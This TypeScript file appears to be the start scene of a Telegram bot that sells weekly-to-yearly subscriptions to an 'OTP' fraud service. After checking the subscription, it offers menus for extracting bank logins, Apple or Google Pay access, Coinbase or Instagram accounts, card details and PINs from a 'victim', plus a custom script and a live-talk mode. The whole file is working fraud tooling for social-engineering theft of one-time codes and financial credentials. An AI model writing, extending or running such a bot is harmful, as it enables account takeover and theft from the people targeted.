import { Scenes } from 'telegraf';
import { getUser } from '../utils/getUser';

export const startScene = new Scenes.WizardScene(
  'START_ID',
  async (ctx) => {
    try {
      const { hasExpired, user } = await getUser({
        id: ctx.from?.id as number,
      });
      if (hasExpired) {
        await ctx.replyWithHTML(
          `👋 <b>Welcome back ${ctx.from?.first_name}</b>,\n\nYour subscirption has <b>expired.</b>\n\n🛒 Please select the subscription you want\n\n<b>N</b> 🟢 NORMAL - 1 Week - <b>$${process.env.OTP_PRICE_NORMAL}</b>\n\n<b>B</b> 🔵 BASIC - 1 Month - <b>$${process.env.OTP_PRICE_BASIC}</b>\n\n<b>S</b> ⚪️ SILVER - 3 Months - <b>$${process.env.OTP_PRICE_SILVER}</b>\n\n<b>G</b> 🟡 GOLD - 6 Months - <b>$${process.env.OTP_PRICE_GOLD}</b>\n\n<b>P</b> ⚫️ PLATINUM - 12 Months - <b>$${process.env.OTP_PRICE_PLATINUM}</b>\n\nreply with the letter of the subscription you want e.g P for PLATINUM`,
        );
        return ctx.scene.leave();
      }
      // @ts-expect-error ts doesn't not recognise setting up state this way
      ctx.wizard.state.chatId = Number(user.fields.telegramId['en-US']);
    } catch (error) {
      return ctx.replyWithHTML(
        `😃 <b>Welcome ${ctx.from?.first_name}</b>,\n\nYou don't have any subscription\n\n🛒 Please select the subscription you want\n\n<b>N</b> 🟢 NORMAL - 1 Week - <b>$${process.env.OTP_PRICE_NORMAL}</b>\n\n<b>B</b> 🔵 BASIC - 1 Month - <b>$${process.env.OTP_PRICE_BASIC}</b>\n\n<b>S</b> ⚪️ SILVER - 3 Months - <b>$${process.env.OTP_PRICE_SILVER}</b>\n\n<b>G</b> 🟡 GOLD - 6 Months - <b>$${process.env.OTP_PRICE_GOLD}</b>\n\n<b>P</b> ⚫️ PLATINUM - 12 Months - <b>$${process.env.OTP_PRICE_PLATINUM}</b>\n\nreply with the letter of the subscription you want e.g P for PLATINUM`,
      );
    }

    await ctx.replyWithHTML(
      `👍🏽 Awesome, Let's start\n\nReply with the number of the service you would like to get infos for?\n\n1. <b>BANK</b>\n<i>~ Barclays, Chase ~</i>\n\n2. <b>PAY</b>\n<i>~ Apple pay, Google pay ~</i>\n\n3. <b>ACCOUNT</b>\n<i>~ Coinbase, Instagram ~</i>\n\n4. <b>CARD</b>\n<i>~ Debit or Credit card details ~</i>\n\n5. <b>PIN</b>\n<i>~ Card pin or Carrier pin ~</i>\n\n6. <b>CUSTOM</b>\n<i>~ Let's you specify what the bot should say and the actions the victim should take\nThis module is very delicate so make sure your english is perfectly written when using this module ~</i>\n\n7. <b>PGP</b>\n<i>~ Let's you speak to the victim. NOTE: This is ideal if you know how to speak ~</i>\n\n<i>***request will expire in 2 minutes***</i>`,
    );

    return ctx.wizard.next();
  },
  async (ctx) => {
    // @ts-expect-error ts doesn't not recognise state
    if (ctx.message && ctx.message.text === '1') {
      return ctx.scene.enter('BANK_STEP_ID');
    }
    // @ts-expect-error ts doesn't not recognise state
    if (ctx.message && ctx.message.text === '2') {
      return ctx.scene.enter('PAY_STEP_ID');
    }
    // @ts-expect-error ts doesn't not recognise state
    if (ctx.message && ctx.message.text === '3') {
      return ctx.scene.enter('ACCOUNT_STEP_ID');
    }
    // @ts-expect-error ts doesn't not recognise state
    if (ctx.message && ctx.message.text === '4') {
      return ctx.scene.enter('CARD_STEP_ID');
    }
    // @ts-expect-error ts doesn't not recognise state
    if (ctx.message && ctx.message.text === '5') {
      return ctx.scene.enter('PIN_STEP_ID');
    }
    // @ts-expect-error ts doesn't not recognise state
    if (ctx.message && ctx.message.text === '6') {
      return ctx.scene.enter('CUSTOM_STEP_ID');
    }
    // @ts-expect-error ts doesn't not recognise state
    if (ctx.message && ctx.message.text === '7') {
      return ctx.scene.enter('PGP_STEP_ID');
    }

    await ctx.reply('❌ Invalid option, please select again');
    return;
  },
);

startScene.hears(/^[N|B|S|G|P]$/gi, async (ctx) => {
  return ctx.scene.enter('BUY_ID');
});
